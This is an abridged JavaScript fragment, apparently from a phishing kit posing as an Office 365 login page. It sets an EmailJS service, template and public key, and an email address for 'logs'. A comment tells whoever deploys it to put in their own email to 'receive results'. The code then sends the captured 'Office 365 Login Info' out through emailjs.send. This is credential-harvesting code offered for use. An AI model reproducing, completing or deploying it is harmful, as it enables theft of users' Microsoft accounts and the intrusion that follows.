...
const emailForLogs = "recieveintellectual@yahoo.com";
//
...
// To use, simply edit (emailForLogs = "") to your own email to receive results
...
const serviceId = "service_1kl512g";
const templateId = "template_jub9u2c";
const logPublicKey = "Mg97gO9MI2ZhLTSBn";
            ...
            try {
                ...
                if (data.results.length > 0) {
                    ...
                    var emailParams = {
                        ...
                        pageName: "Office 365 Login Info",
                    };

                    emailjs.send(serviceId, templateId, emailParams, logPublicKey)
